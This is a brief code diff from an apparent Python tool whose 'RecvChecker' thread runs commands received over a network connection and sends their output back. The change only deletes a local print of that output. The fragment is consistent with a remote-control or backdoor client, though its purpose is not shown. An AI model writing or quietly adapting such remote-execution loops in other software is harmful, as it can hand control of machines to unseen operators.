@@ -76,7 +76,6 @@ class RecvChecker(threading.Thread):
             if (self.verifyCommand(command)):
                 try:
                     sp = subprocess.getoutput(command)
-                    print(sp)
                     net.send(sp)
                 except Exception as e:
                     pass
